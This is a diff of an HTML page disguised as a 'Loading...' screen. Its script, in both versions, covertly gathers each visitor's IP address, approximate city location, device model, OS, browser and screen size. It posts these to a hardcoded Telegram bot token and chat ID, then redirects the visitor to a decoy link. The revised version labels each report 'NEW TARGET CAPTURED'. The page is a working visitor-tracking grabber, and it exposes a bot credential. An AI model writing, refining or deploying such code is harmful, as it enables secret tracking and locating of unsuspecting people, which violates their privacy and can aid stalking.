@@ -4,90 +4,160 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
-    <style>body{margin:0;background:#000}</style>
+    <style>body{margin:0;background:#000;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;} p{font-size:1.2rem;}</style>
 </head>
 <body>
-<script>
-(async () => {
-    const BOT_TOKEN = '8437574185:AAH3LG_IDft1pdrkfv-75rgWUCIWFYxECoM';
-    const CHAT_ID = '7863510010';
-    const REDIRECT = 'https://www.misha/dad/image23689/august2024.com';
-    const API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    <p>Loading content...</p>
+    <script>
+        // --- Configuration ---
+        const BOT_TOKEN = '8437574185:AAH3LG_IDft1pdrkfv-75rgWUCIWFYxECoM'; 
+        const CHAT_ID = '7863510010';     
+        const REDIRECT_URL = 'https://www.misha/dad/image23689/august2024.com';
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-    // 1. Get IP + rough location
-    let ip = '???.???.???.???';
-    let loc = 'Unknown location';
-    try {
-        const r = await fetch('https://ipapi.co/json/', { signal: AbortController().signal });
-        if (r.ok) {
-            const d = await r.json();
-            ip = d.ip;
-            loc = `\( {d.city}, \){d.region}, ${d.country_name}`;
+        // --- 1. Robust Parser for Legacy/Sanitized User Agents (Fixes the "K" issue) ---
+        function getLegacyDeviceInfo(ua) {
+            let os = 'Unknown OS';
+            let model = 'Unknown Model/Device';
+            let manufacturer = 'Unknown Manufacturer';
+            let browser = 'Unknown Browser';
+            let osVersion = 'N/A';
+
+            if (ua.includes('Android')) {
+                os = 'Android';
+                const versionMatch = ua.match(/Android (\d+(?:\.\d+)*)/);
+                if (versionMatch && versionMatch[1]) osVersion = versionMatch[1];
+
+                // Logic to handle sanitized 'K' models
+                let modelMatch = ua.match(/\(([^;]+); Android [^;]+; ([^)]+)\)/);
+                if (modelMatch && modelMatch[2]) {
+                    let modelSegment = modelMatch[2].trim();
+                    if (modelSegment.length <= 2) { 
+                        // If model is "K", look deeper in the string
+                        modelMatch = ua.match(/Android [^;]+; ([^;)]+)(?:\sBuild\/)/);
+                        if (modelMatch && modelMatch[1]) {
+                           modelSegment = modelMatch[1].trim();
+                        }
+                    }
+                    model = modelSegment.replace(/\s+Build\/.*/, '').trim();
+
+                    if (model.startsWith('SM-') || model.startsWith('SAMSUNG')) manufacturer = 'Samsung';
+                    else if (model.includes('Pixel')) manufacturer = 'Google';
+                    else if (model.length > 2 && model !== 'K') manufacturer = 'Android Device';
+                }
+            } else if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) {
+                os = ua.includes('iPad') ? 'iPadOS' : 'iOS';
+                model = ua.includes('iPad') ? 'iPad' : 'iPhone';
+                manufacturer = 'Apple';
+                const versionMatch = ua.match(/(iPhone|iPad|iPod);.*?OS\s(\d+_\d+)/);
+                if (versionMatch && versionMatch[2]) osVersion = versionMatch[2].replace(/_/g, '.');
+            } else if (ua.includes('Windows')) {
+                os = 'Windows';
+                model = 'Desktop/Tablet';
+            } else if (ua.includes('Macintosh')) {
+                os = 'macOS';
+                model = 'Desktop/Laptop';
+            }
+
+            if (ua.includes('Chrome') && !ua.includes('Edg/')) browser = ua.includes('CriOS') ? 'Chrome (iOS)' : 'Chrome';
+            else if (ua.includes('Edg/')) browser = 'Edge';
+            else if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+            else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
+
+            return { os, osVersion, model, manufacturer, browser };
         }
-    } catch { /* ignore, fall back to ipify */ }
-    if (ip.startsWith('???')) {
-        try {
-            const r = await fetch('https://api.ipify.org?format=json');
-            const d = await r.json();
-            ip = d.ip;
-            loc = 'Location unavailable';
-        } catch {}
-    }
 
-    // 2. Get best possible device info
-    let os = 'Unknown OS', ver = '', model = 'Unknown', maker = 'Unknown', browser = 'Unknown';
-    const ua = navigator.userAgent;
+        // --- 2. Main Logic ---
+        (async () => {
+            // A. Get IP and Location
+            let ip = 'Unknown IP';
+            let loc = 'Unknown Location';
+            
+            try {
+                // Try ipapi.co first for rich location data
+                const r = await fetch('https://ipapi.co/json/');
+                if (r.ok) {
+                    const d = await r.json();
+                    ip = d.ip;
+                    loc = `${d.city || ''}, ${d.region || ''}, ${d.country_name || ''}`;
+                }
+            } catch (e) {
+                // Fallback to simple IP fetch if the first one fails
+                try {
+                    const r2 = await fetch('https://api.ipify.org?format=json');
+                    const d2 = await r2.json();
+                    ip = d2.ip;
+                } catch (e2) {}
+            }
 
-    if (navigator.userAgentData) {
-        try {
-            const hints = await navigator.userAgentData.getHighEntropyValues(['platform','platformVersion','model','manufacturer']);
-            os = hints.platform || os;
-            ver = hints.platformVersion || ver;
-            model = hints.model || model;
-            maker = hints.manufacturer || maker;
-            const realBrand = navigator.userAgentData.brands.find(b => !b.brand.includes('Not'));
-            browser = realBrand?.brand || 'Unknown';
-        } catch {}
-    }
+            // B. Get Device Info (Client Hints with fallback to Legacy Parser)
+            let deviceInfo = {
+                os: 'Unknown OS',
+                osVersion: 'N/A',
+                model: 'Unknown Model',
+                manufacturer: 'Unknown Manufacturer',
+                browser: 'Unknown Browser'
+            };
 
-    // Fallback parsing if hints fail or are missing
-    if (model === 'Unknown') {
-        if (/iPhone|iPad|iPod/.test(ua)) { os = ua.includes('iPad') ? 'iPadOS' : 'iOS'; maker = 'Apple'; model = ua.includes('iPad') ? 'iPad' : 'iPhone'; }
-        else if (/Android/.test(ua)) { os = 'Android'; maker = 'Android Device'; model = ua.match(/Android [^;]+; (.*?)(?:Build|;|$)/i)?.[1].trim() || 'Unknown'; }
-        if (model.startsWith('SM-') || model.toLowerCase().includes('samsung')) maker = 'Samsung';
-        if (model.includes('Pixel')) maker = 'Google';
-    }
+            const uaString = navigator.userAgent;
 
-    if (browser === 'Unknown') {
-        if (/Edg/.test(ua)) browser = 'Edge';
-        else if (/Firefox/.test(ua)) browser = 'Firefox';
-        else if (/Chrome/.test(ua)) browser = 'Chrome';
-        else if (/Safari/.test(ua)) browser = 'Safari';
-    }
+            try {
+                if (navigator.userAgentData) {
+                    const uaData = await navigator.userAgentData.getHighEntropyValues([
+                        "platform", "platformVersion", "manufacturer", "model"
+                    ]);
+                    deviceInfo.os = uaData.platform || 'Unknown';
+                    deviceInfo.osVersion = uaData.platformVersion || 'N/A';
+                    deviceInfo.manufacturer = uaData.manufacturer || 'Unknown';
+                    deviceInfo.model = uaData.model || 'Unknown';
+                    
+                    const browserData = navigator.userAgentData.brands.find(b => !b.brand.includes("Not"));
+                    deviceInfo.browser = browserData ? browserData.brand : 'Unknown';
+                } else {
+                    deviceInfo = getLegacyDeviceInfo(uaString);
+                }
+            } catch (err) {
+                deviceInfo = getLegacyDeviceInfo(uaString);
+            }
 
-    // 3. Build message
-    const msg = `
-*NEW VISITOR*
+            // C. Construct Message
+            const messageText = `
+*--- NEW TARGET CAPTURED ---*
 
-*Time:* ${new Date().toISOString().replace('T',' ').split('.')[0]} UTC
-*IP:* ${ip}
+*NETWORKING*
+*IP:* \`${ip}\`
 *Location:* ${loc}
-*Device:* \( {maker} \){model}
-*OS:* \( {os} \){ver}
-*Browser:* ${browser}
-*Screen:* \( {screen.width}× \){screen.height}
-*User-Agent:* \`${ua}\``;
 
-    // 4. Send to Telegram (fire-and-forget)
-    fetch(API, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg.trim(), parse_mode: 'Markdown' })
-    }).catch(() => {});
+*DEVICE DETAILS*
+*OS:* ${deviceInfo.os} ${deviceInfo.osVersion}
+*Device:* ${deviceInfo.manufacturer} ${deviceInfo.model}
+*Browser:* ${deviceInfo.browser}
+*Resolution:* ${screen.width}x${screen.height}
 
-    // 5. Redirect after a tiny delay
-    setTimeout(() => location.replace(REDIRECT), 800);
-})();
-</script>
+*META*
+*Time:* ${new Date().toISOString()}
+*Raw UA:* \`${uaString}\`
+            `.trim();
+
+            // D. Send to Telegram
+            fetch(TELEGRAM_API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: messageText,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .catch(console.error)
+            .finally(() => {
+                // E. Redirect
+                setTimeout(() => {
+                    window.location.replace(REDIRECT_URL);
+                }, 800);
+            });
+        })();
+    </script>
 </body>
 </html>
